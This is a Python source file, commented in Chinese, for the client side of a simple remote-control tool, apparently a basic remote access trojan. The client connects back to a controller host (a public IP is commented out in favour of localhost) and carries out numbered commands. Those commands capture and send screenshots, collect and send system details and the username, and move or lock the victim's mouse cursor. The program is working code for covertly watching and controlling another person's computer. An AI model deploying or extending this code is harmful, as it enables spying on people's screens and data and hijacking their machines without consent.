#_*_ coding:utf-8 _*_
import socket
import json
import struct

def PackLen(dwSize):
    #输入:长度
    #输出:可传送的struct字节流
    return bytes(struct.pack('i',dwSize))
    
def UnpackLen(len_data):
    #输入:struct打包
    #输出:int 长度
    recvLen=struct.unpack('i',len_data)
    return int(recvLen[0])

def screenshot(ConnSock):
    print("at screenshot")
    import pyautogui
    import io
    from PIL import Image
    img = pyautogui.screenshot()#截图
    print("截图成功")
    img_byte=io.BytesIO()#字节流IO
    img.save(img_byte,format="JPEG")#转格式
    binary_str=img_byte.getvalue()#保存
    print("数据长度："+str(len(binary_str)))
    ConnSock.send(PackLen(len(binary_str)))#先发送4字节长度
    #发送数据
    ConnSock.sendall(binary_str)


def sysinfo(ConnSock):
    print("sysinfo")
    import os
    import platform
    import getpass
    from multiprocessing import cpu_count
    #字典
    sysinfoDict = {}
    sysinfoDict['Computer']=socket.gethostname()
    sysinfoDict['Os']=platform.platform()
    sysinfoDict['Architecture']= platform.machine()
    CPU = os.popen('wmic cpu get Name').read()
    start1 = CPU.find('\n')
    start2=CPU.find('\n',start1+1)
    end = CPU.find('\n',start2+1)
    sysinfoDict['CPU']=CPU[start2+1:end]
    sysinfoDict['CPU family']=platform.processor()
    sysinfoDict['CPU thread']= cpu_count()
    sysinfoDict['Username'] = getpass.getuser()
    
    
    #dump成json
    SendData=json.dumps(sysinfoDict)
    SendData = bytes(SendData.encode('utf-8'))
    #结构化发送
    ConnSock.send(PackLen(len(SendData)))#先发送4字节长度
    #发送数据
    ConnSock.sendall(SendData)

def systeminfo(ConnSock):
    import os
    print("systeminfo")
    #popen 系统命令，对于win10以上有效果
    systeminfoStr=os.popen('systeminfo').read()
    systeminfoStr=bytes(systeminfoStr.encode('utf-8'))
    #结构化发送
    ConnSock.send(PackLen(len(systeminfoStr)))#先发送4字节长度
    ConnSock.sendall(systeminfoStr)
    
def mouse(ConnSock):
    print("mouse")
    PosX=UnpackLen(ConnSock.recv(4))
    PosY=UnpackLen(ConnSock.recv(4))
    import ctypes
    ctypes.WinDLL('user32.dll').SetCursorPos(PosX,PosY)
    
def Beep(ConnSock,*args):
    print("Beep")
    import ctypes
    ctypes.WinDLL('Kernel32.dll').Beep(2000,1000)

def LockMouse10s(*args):
    import time
    import ctypes
    for i in range(100):
        #print("锁定: "+str(i))
        ctypes.WinDLL('user32.dll').SetCursorPos(0,0)
        time.sleep(0.1)
        
def lockmouse(ConnSock,*args):
    print("---------Lock--------")
    from threading import Thread
    import time
    import ctypes
    t1=Thread(target=LockMouse10s, args=("线程1",))
    t1.start()
    
def close(ConnSock,*args):
    print("---------close--------")
    ConnSock.close()
    exit(0)

def default(ConnSock):
    print("输入错误，请重新输入命令!")

CommandList = {
    1:screenshot,
    2:sysinfo,
    3:systeminfo,
    4:mouse,
    5:Beep,
    6:lockmouse,
    99:close
    }
    
if __name__ == '__main__':
    #Host = '36.133.142.149'
    Host = '127.0.0.1'
    Port = 3066
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.connect((Host,Port))
    print("已经连接到主控！")
    while(True):
        Command = UnpackLen(c.recv(4))
        print("接受到命令: "+str(Command))
        CommandList.get(int(Command),default)(c)#函数指针，命令分发https://www.cnblogs.com/yly123/p/15716863.html
        
    

    
